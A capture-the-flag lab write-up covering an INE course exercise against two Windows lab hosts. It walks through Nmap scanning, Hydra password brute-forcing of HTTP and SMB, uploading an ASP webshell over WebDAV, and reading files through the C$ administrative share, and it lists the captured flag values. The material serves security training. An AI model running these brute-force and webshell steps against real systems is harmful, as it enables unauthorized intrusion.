# Lab Notes – System-Host Based Attacks CTF 1

**Course:** Host & Network Penetration Testing  
**Platform:** INE  
**Lab:** System-Host Based Attacks CTF 1  
**Environment:** Kali Linux  
**Targets:** `target1.ine.local`, `target2.ine.local`

---

## Lab Environment

Two Windows machines were available:

```text
target1.ine.local
target2.ine.local
```

### Useful Files

```text
/usr/share/metasploit-framework/data/wordlists/common_users.txt

/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

/usr/share/webshells/asp/webshell.asp
```

### Objectives

1. **Flag 1:** User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
2. **Flag 2:** Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
3. **Flag 3:** By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
4. **Flag 4:** The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

---

# Flag 1 – Weak HTTP Credentials and WebDAV Enumeration

**Target:** `target1.ine.local`

## Step 1 – Service Enumeration

Started by scanning the target using Nmap.

```bash
nmap -sV -sC target1.ine.local
```

**Command explanation:**

- `-sV` – Detects service versions.
- `-sC` – Runs default Nmap scripts.
- `target1.ine.local` – Target hostname.

### Findings

| Port | Service | Version / Information |
|---|---|---|
| 80 | HTTP | Microsoft IIS 10.0 |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | NetBIOS session service |
| 445 | SMB | Microsoft SMB |
| 3389 | RDP | Microsoft Terminal Services |

The HTTP service returned:

```text
401 Unauthorized
Basic realm=target1.ine.local
```

This indicated that HTTP authentication was enabled.

## Step 2 – Testing Bob's Password

Used Hydra with the supplied password wordlist.

```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get
```

**Command explanation:**

- `-l bob` – Specifies a single username.
- `-P` – Specifies the password wordlist.
- `unix_passwords.txt` – Password list supplied by INE.
- `http-get` – Tests HTTP GET authentication.

Hydra successfully discovered valid credentials for the `bob` account.

The recovered password is intentionally omitted.

## Step 3 – Directory Enumeration

Used Gobuster to identify accessible web directories.

```bash
gobuster dir -u target1.ine.local -w /usr/share/wordlists/dirb/common.txt -U bob --password <redacted>
```

**Command explanation:**

- `dir` – Directory enumeration mode.
- `-u` – Target URL.
- `-w` – Directory wordlist.
- `-U` – HTTP authentication username.
- `--password` – HTTP authentication password.

### Findings

```text
/aspnet_client        (Status: 301)
/webdav               (Status: 301)
```

The `/webdav` directory was selected for further investigation.

## Step 4 – Connecting to WebDAV

Connected using Cadaver:

```bash
cadaver http://target1.ine.local
```

After authentication, navigated into the WebDAV directory:

```text
cd webdav
ls
```

### Findings

```text
flag1.txt
readme.txt
test.asp
web.config
```

## Step 5 – Retrieving Flag 1

Used the following command inside the Cadaver session:

```text
cat flag1.txt
```

### Output

```text
e70af50ecd504c1a83effa613e88e548
```

**Flag 1 captured successfully.**

---

# Flag 2 – ASP Webshell and Windows File Access

**Target:** `target1.ine.local`

## Step 1 – Identifying the ASP Webshell

The lab supplied an ASP webshell at:

```text
/usr/share/webshells/asp/webshell.asp
```

Since the WebDAV directory allowed file uploads, I used the supplied webshell to investigate the Windows filesystem.

## Step 2 – Uploading the Webshell

While connected to WebDAV through Cadaver, executed:

```text
put /usr/share/webshells/asp/webshell.asp
```

**Command explanation:**

- `put` – Uploads a local file to the remote WebDAV directory.
- The supplied path identifies the local ASP webshell.

### Upload Result

```text
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: 100.0% of 1362 bytes succeeded.
```

The upload completed successfully.

## Step 3 – Opening the Webshell in the Browser

This step was performed through the browser rather than the Kali terminal.

Opened:

```text
http://target1.ine.local/webdav/webshell.asp
```

The uploaded ASP webshell displayed an interface for executing commands on the Windows server.

## Step 4 – Reading the Flag File

Entered the following command in the webshell's command input:

```cmd
type c:\flag2.txt
```

**Command explanation:**

- `type` – Windows command used to display the contents of a text file.
- `c:\flag2.txt` – Flag file located in the root of the C: drive.

The ASP webshell executed the command on the target and displayed the contents of the file.

**Flag 2 captured successfully through the browser-based webshell.**

*Note: The exact Flag 2 hash was not present in the saved terminal transcript.*

---

# Flag 3 – SMB Credential Testing

**Target:** `target2.ine.local`

## Step 1 – Testing SMB Credentials

Used Hydra with the two wordlists supplied by INE.

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local
```

**Command explanation:**

- `-L` – Specifies a file containing multiple usernames.
- `common_users.txt` – Username wordlist.
- `-P` – Specifies a password wordlist.
- `unix_passwords.txt` – Password list.
- `smb://target2.ine.local` – SMB authentication target.

### Findings

Hydra discovered four valid credential combinations.

The credentials are omitted from this public write-up.

## Step 2 – Enumerating SMB Shares

Used SMBClient to list the available shares.

```bash
smbclient -L target2.ine.local -U administrator
```

**Command explanation:**

- `-L` – Lists available SMB shares.
- `-U administrator` – Specifies the username.

### Findings

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Shared          Disk
Shared2         Disk
Shared3         Disk
```

The `C$` administrative share provided access to the Windows C: drive.

## Step 3 – Connecting to the C$ Share

Connected using:

```bash
smbclient \\\\target2.ine.local\\C$ -U administrator
```

After authentication, listed the contents:

```text
ls
```

### Finding

The root directory contained:

```text
flag3.txt
```

## Step 4 – Downloading Flag 3

Initially attempted:

```text
cat flag3.txt
```

However, `cat` is not an available command inside the SMBClient interactive prompt.

Used `get` instead:

```text
get flag3.txt
```

This downloaded the file to the Kali machine.

Exited the SMB session and read the downloaded file:

```bash
cat flag3.txt
```

### Output

```text
c72a2ebe954f40bd91fd19618104b0ab
```

**Flag 3 captured successfully.**

---

# Flag 4 – Administrator Desktop Enumeration

**Target:** `target2.ine.local`

## Step 1 – Enumerating Windows User Directories

Continued using the existing SMBClient connection to the C$ share.

Navigated to the Users directory:

```text
cd Users
ls
```

### Findings

```text
Administrator
All Users
Default
Default User
Public
student
```

The Administrator profile was selected for further enumeration.

## Step 2 – Exploring the Administrator Directory

Navigated into the Administrator directory:

```text
cd Administrator
ls
```

The listing showed several directories, including:

```text
Desktop
Documents
Downloads
Pictures
Music
Videos
```

## Step 3 – Enumerating the Desktop

Navigated into the Desktop directory:

```text
cd Desktop
ls
```

### Findings

```text
desktop.ini
flag4.txt
```

The required flag file was located.

## Step 4 – Downloading Flag 4

Initially tried:

```text
cd flag4.txt
```

This returned:

```text
NT_STATUS_NOT_A_DIRECTORY
```

The error occurred because `flag4.txt` was a file, not a directory.

Used the correct command:

```text
get flag4.txt
```

The file was downloaded successfully.

## Step 5 – Reading Flag 4 Locally

Exited SMBClient and used:

```bash
cat flag4.txt
```

### Output

```text
9e003162b14f4e88892ab0eafbab9fc1
```

**Flag 4 captured successfully.**

---

# Final Flag Summary

| Flag | Target | Retrieval Method | Status |
|---|---|---|---|
| Flag 1 | target1 | WebDAV `flag1.txt` | Captured |
| Flag 2 | target1 | ASP webshell, `C:\flag2.txt` | Captured |
| Flag 3 | target2 | SMB C$ share root | Captured |
| Flag 4 | target2 | Administrator Desktop | Captured |

### Confirmed Flag Values

| Flag | Value |
|---|---|
| Flag 1 | `e70af50ecd504c1a83effa613e88e548` |
| Flag 3 | `c72a2ebe954f40bd91fd19618104b0ab` |
| Flag 4 | `9e003162b14f4e88892ab0eafbab9fc1` |

Flag 2 was captured through the browser-based ASP webshell, but its exact value was not present in the saved terminal transcript.

---

# Key Learnings

1. Used Nmap for Windows service and version enumeration.
2. Tested weak HTTP credentials using Hydra.
3. Discovered web directories using Gobuster.
4. Accessed and enumerated WebDAV using Cadaver.
5. Uploaded an ASP webshell through WebDAV.
6. Executed Windows commands through a browser-based ASP webshell.
7. Tested SMB credentials using Hydra.
8. Enumerated SMB shares using SMBClient.
9. Accessed the Windows C$ administrative share.
10. Downloaded files from SMB shares using `get`.

---

# Conclusion

This lab demonstrated how weak credentials, exposed WebDAV functionality, and poorly protected SMB shares can lead to access to sensitive Windows files.

Completing all four objectives provided practical experience with HTTP authentication testing, WebDAV file operations, ASP webshell execution, SMB enumeration, and Windows filesystem exploration.

## Disclaimer

All activities documented here were performed in an authorized INE lab environment. These techniques should only be used for educational purposes and against systems for which explicit authorization has been granted.
